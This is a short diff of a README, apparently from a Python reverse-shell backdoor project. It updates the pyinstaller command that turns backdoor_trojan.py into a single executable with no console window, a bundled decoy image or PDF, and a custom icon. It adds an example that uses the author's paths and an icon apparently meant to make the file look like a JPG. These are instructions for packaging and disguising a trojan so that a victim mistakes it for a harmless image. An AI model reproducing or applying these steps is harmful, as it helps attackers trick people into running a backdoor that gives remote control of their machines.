@@ -62,7 +62,11 @@ Step 2
 Once the files have been edited for your machine's IP, target's OS, it can be converted to a executable using pyinstaller, or can be used as it is
 ```
 pip3 install pyinstaller
-pyinstaller --add-data "<Full path of the image/pdf>:." --onefile --noconsole backdoor_trojan.py
+pyinstaller --add-data "<Full path of the image/pdf>:." --onefile --noconsole --icon "<icon> backdoor_trojan.py
+```
+For example, on my machine,
+```
+pyinstaller --add-data "/home/fox/PythonHacking/revshell_backdoor/ditf.jpg:." --onefile --noconsole --icon /home/fox/PythonHacking/revshell_backdoor/jpg_2 backdoor_trojan.py
 ```
 The executable will be found in the dist folder
 
